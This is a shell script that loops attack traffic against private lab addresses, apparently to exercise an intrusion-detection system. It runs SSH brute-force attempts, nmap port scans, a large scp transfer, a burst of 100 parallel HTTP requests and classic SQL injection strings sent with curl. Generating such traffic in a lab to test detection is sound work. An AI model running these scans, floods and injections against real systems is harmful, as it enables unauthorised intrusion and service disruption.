#!/bin/sh

# Define the IP addresses for each type of server
SSH_SERVER="172.18.0.2"
FTP_SERVER="172.18.0.3"
HTTP_SERVER="172.18.0.4"
WEB_SERVER="172.18.0.4"
ALL_SERVERS="$SSH_SERVER $FTP_SERVER $HTTP_SERVER $WEB_SERVER"
PORTS="1-1024"
USERNAMES="INTRUDER"
VALID_USERNAME="INTRUDER"
VALID_PASSWORD="argusIsTheBest123"

# Create a large file if it doesn't exist
LARGE_FILE="largefile.dat"
if [ ! -f $LARGE_FILE ]; then
  dd if=/dev/urandom of=$LARGE_FILE bs=100M count=10
fi

send_sql_injection() {
  local payload="$1"
  local url="http://$WEB_SERVER/path/to/vulnerable/endpoint?param1=value1&param2=$payload"
  curl -X GET "$url" || true
}

while true; do
  counter=0

  # SSH brute force on the SSH server
  for user in $USERNAMES; do
    echo "Trying $user on SSH"
    sshpass -p 'password' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -t $user@$SSH_SERVER -p 22 || true
  done

  # Port scanning
  echo "Starting port scanning"
  for target in $ALL_SERVERS; do
    echo "Scanning $target"
    nmap -p $PORTS $target &>/dev/null || true
  done

  # Sending a large file
  echo "Sending large file to $FTP_SERVER"
  sshpass -p $VALID_PASSWORD scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 $LARGE_FILE $VALID_USERNAME@$FTP_SERVER:/dev/null &>/dev/null || true

  if [ $counter -eq 0 ]; then
    for i in {1..100}; do
      curl -X GET "http://$WEB_SERVER/" &>/dev/null &
    done
  fi

  # Sending SQL injection attempts to the web server
  echo "Sending SQL injection attempts to the web server"
  send_sql_injection "1' OR '1'='1"
  send_sql_injection "admin'--"   
  send_sql_injection "SELECT * FROM users"

  counter=$((counter+1))
  sleep 10
done
